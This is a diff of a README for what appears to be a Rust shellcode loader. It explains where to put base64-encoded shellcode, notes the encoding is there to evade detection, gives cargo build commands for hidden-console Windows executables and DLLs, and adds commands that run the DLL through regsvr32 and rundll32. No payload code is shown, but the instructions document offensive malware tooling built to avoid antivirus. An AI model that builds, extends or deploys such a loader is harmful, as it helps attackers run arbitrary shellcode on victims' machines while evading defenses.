@@ -5,9 +5,8 @@ The shellcode has to be put in the src/payload.b64 file.
 
 shell is base64 encoded to prevent donut detection
 
-## To build : 
 
-### Executable
+# Executable
 Win x86
 ```shell
 cargo build --target i686-pc-windows-gnu --release --features no_console
@@ -17,15 +16,26 @@ Win x64
 cargo build --target x86_64-pc-windows-gnu --release --features no_console
 ```
 
-### Dll
+# Dll
+## regsvr
+### build
 Win x86
 ```shell
-cargo build --target i686-pc-windows-gnu --release --lib
+cargo build --target i686-pc-windows-gnu --release --lib --features regsvr
 ```
 Win x64
 ```shell
-cargo build --target x86_64-pc-windows-gnu --release --lib
+cargo build --target x86_64-pc-windows-gnu --release --lib --features regsvr
 ```
+
+### fire
+```shell
+regsvr32 /s .\rustloaderlib.dll
+```
+```shell
+rundll32.exe .\rustloaderlib.dll,DllRegisterServer
+```
+
 
 ## Generate payload : 
 ```shell
